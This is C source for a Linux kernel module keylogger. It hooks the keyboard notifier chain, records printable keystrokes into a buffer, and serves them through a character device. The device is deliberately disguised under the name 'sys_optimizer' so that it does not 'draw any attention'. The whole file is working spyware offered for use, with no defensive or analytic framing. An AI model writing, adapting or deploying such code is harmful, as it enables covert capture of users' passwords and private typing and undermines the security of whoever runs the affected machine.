#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>

// Module Info

#define DEVICE_NAME "sys_optimizer" // The device name for our Device DRiver using an alias to not draw any attention. 
static int major; // The Major Number that will be assigned to our Device Drvier

// Keylogger Info

#define BUFFER_LEN 1024
static char keys_buffer[BUFFER_LEN]; // This buffer will contain all the logged keys
static char *keys_bf_ptr = keys_buffer;
/*
 * Note: Our buffer will only be of size 1024. 
 * If the user typed more then 1024 valid characters,
 * the keys_buf_ptr would overflow.
 * To avoid this, we will use buf_pos to keep track of the
 * count of characters read.
 */
int buf_pos = 0; 

// Prototypes
static ssize_t dev_read(struct file *, char __user *, size_t, loff_t *); // Device Driver read prototype
static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification chain

// Setting the Device Driver read function so we could read form it
static struct file_operations fops = {
	.read = dev_read
};

// Initializing the notifier_block
static struct notifier_block nb = {
	.notifier_call = keys_pressed
};

static int keys_pressed(struct notifier_block *nb, unsigned long action,void *data){
	struct keyboard_notifier_param *param = data;

	// We are only interesrted in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
	if (action == KBD_KEYSYM && param->down){
		char c = param->value;
		
		// We will only log those key presses that actually represent an ASCII character.
		if (c == 0x01){
			*(keys_bf_ptr++) = 0x0a;
			buf_pos++;
		} else if (c >= 0x20 && c < 0x7f){
			*(keys_bf_ptr++) = c;
			buf_pos++;
		}

		// Check with buf_pos for buffer overflows
		if (buf_pos >= BUFFER_LEN){
			buf_pos = 0;
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_bf_ptr = keys_buffer;
		}
	}
	return NOTIFY_OK; // This retrun value means that the notification was processed correctly.
}

// Device driver read function , use to retrieve data from the device
static ssize_t dev_read(struct file *fp,char __user *buf, size_t length, loff_t *offset){
	int len = strlen(keys_buffer);
	int result = copy_to_user(buf, keys_buffer , len);
	if (result){
		pr_info("Couldn't copy all data to user space\n");
		return result;
	}
	memset(keys_buffer, 0 , BUFFER_LEN); // Reset buffer after each read
	keys_bf_ptr = keys_buffer; // Reset buffer pointer
	return len;
}

static int __init keyLogger_birth(void){
	major = register_chrdev(0, DEVICE_NAME,&fops);
	if (major < 0 ){
		pr_info("keylog failed to register a major number\n");
		return major;
	}
	
	register_keyboard_notifier(&nb);
	memset(keys_buffer, 0, BUFFER_LEN);
        pr_info("A new keyLogger was born , with major number %d\n", major);
	return 0;
}

static void __exit keyLogger_death(void){
	unregister_chrdev(major, DEVICE_NAME);
	unregister_keyboard_notifier(&nb);
        pr_info("The keyLogger is dead\n");
}

module_init(keyLogger_birth);
module_exit(keyLogger_death);
MODULE_LICENSE("GPL");
